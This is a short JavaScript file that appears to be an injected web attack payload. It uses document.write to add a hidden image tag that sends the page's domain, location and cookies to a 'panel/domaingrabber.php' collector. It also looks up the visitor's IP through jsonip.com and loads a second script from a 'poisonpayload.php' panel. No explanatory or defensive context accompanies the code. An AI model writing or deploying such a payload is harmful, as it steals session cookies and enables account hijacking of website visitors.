function payload()
{
	x = document.getElementById("poisonpayload");
	
	if (x == null)
	{
		
		document.write("<script>function getip(json){ document.write('<script type=\\\"application/javascript\\\" src=\\\"http://localhost/panel/poisonpayload.php?id=\'+ json.ip + \'\\\"></scr\'+\'ipt>'); }; </script>");
		document.write("<img id='domaingrabber' src='http://localhost/panel/domaingrabber.php?domain="+document.domain+"&location="+document.location+"&cookie="+document.cookie+"' style='display:none;'/>");
	};

	
	
	document.write("<script id='poisonpayload' type='application/javascript' src='https://jsonip.com/?callback=getip'></script>");
	
	}	

payload();
